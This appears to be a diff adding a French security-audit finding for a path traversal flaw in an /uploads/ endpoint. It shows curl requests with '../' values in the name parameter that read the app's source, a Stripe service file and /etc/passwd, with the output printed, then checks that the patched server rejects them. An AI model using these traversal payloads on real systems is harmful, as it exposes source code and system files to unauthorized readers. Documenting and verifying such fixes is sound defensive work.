@@ -1,0 +1,29 @@
+====================  D2 — PATH TRAVERSAL  ====================
+
+# Lecture arbitraire de fichiers via ?name= :
+
+$ curl -G /uploads/ --data-urlencode "name=../app.py"     (code source back)
+     | from flask import Flask
+     | from flask_cors import CORS
+     | from database.init import db
+     | from database.seed import seed_database
+     | ...
+
+$ curl -G /uploads/ --data-urlencode "name=../services/stripe.py"   (logique Stripe)
+     | 
+     | def get_checkout_lines(checkout_session_id):
+     |     url = f"https://api.stripe.com/v1/checkout/sessions/{checkout_session_id}/line_items"
+     | 
+     |     session = requests.Session()
+     |     session.auth = (os.getenv('STRIPE_API_KEY'), "")
+     |     return session.get(url).json()["data"]
+
+$ curl -G /uploads/ --data-urlencode "name=../../../../../etc/passwd"   (hors application)
+     | root:x:0:0:root:/root:/bin/bash
+     | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+------------------  APRES CORRECTIF (:9002)  ------------------
+  name=../app.py                    -> HTTP 400
+  name=../../../../../etc/passwd    -> HTTP 400
+  name=..%2f..%2fapp.py             -> HTTP 400
+  name=room-1.jpg                   -> HTTP 200  (fichier legitime servi)
